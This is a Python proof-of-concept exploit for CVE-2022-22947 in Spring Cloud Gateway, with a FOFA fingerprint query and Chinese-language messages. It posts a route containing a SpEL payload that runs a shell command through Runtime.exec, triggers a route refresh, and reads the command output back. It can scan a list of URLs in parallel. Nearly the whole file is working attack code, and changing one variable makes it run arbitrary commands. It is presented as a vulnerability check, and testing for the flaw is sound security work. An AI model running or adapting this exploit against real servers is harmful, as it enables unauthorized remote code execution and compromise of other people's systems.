#FOFA: icon_hash="116323821"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'Spring Cloud Gateway Actuator API SpEL 代码注入 (CVE-2022-22947)',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Connection': 'close',
        'Content-Type': 'application/json',
    }
    try:
        cmd = 'id'
        timeout = 3
        rand_str = ''.join(random.sample(string.digits + string.ascii_letters, 7))
        payload = {
            "id": rand_str,
            "filters": [{
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"%s\"}).getInputStream()))}" % cmd
                }}],
            "uri": "http://example.com"
        }
        vurl1 = urllib.parse.urljoin(target, '/actuator/gateway/routes/' + rand_str)
        vurl2 = urllib.parse.urljoin(target, '/actuator/gateway/refresh')
        rep1 = requests.post(vurl1, timeout=timeout, data=json.dumps(payload), headers=headers, verify=False)
        if rep1.status_code == 201:
            rep2 = requests.post(vurl2, timeout=timeout, headers=headers, verify=False)
            rep3 = requests.get(vurl1, timeout=timeout, headers=headers, verify=False)
            if rep2.status_code == 200 and re.search('uid=.+gid=.+groups=.+', rep3.text):
                result['vulnerable'] = True
                result['url'] = target
                result['payload'] = vurl1
        print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("CVE-2022-22947Spring Cloud Gateway Actuator API SpEL 代码注入漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()